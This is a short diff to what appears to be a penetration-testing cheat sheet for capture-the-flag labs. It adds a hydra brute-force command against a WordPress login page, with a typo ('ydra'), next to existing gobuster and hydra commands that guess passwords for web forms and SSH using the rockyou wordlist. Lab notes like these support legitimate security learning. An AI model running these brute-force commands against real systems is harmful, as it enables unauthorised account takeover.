@@ -92,6 +92,8 @@ gobuster dir -u http://ip:port -w /usr/share/wordlists/dirb/common.txt -x php,ht
 
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 http-form-post "/login:username=^USER^&password=^PASS^:F=incorrect" (web login portal password)
 
+ydra -l kwheel -P /usr/share/wordlists/rockyou.txt 10.10.67.83 -t 4 http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1:F=incorrect" (wordpress)
+
 hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.212.195 -t 4 ssh
 
 hydra -l sam -P /usr/share/wordlists/rockyou.txt 10.10.120.174 -t 4 -s 4567 ssh (ssh port 4567)
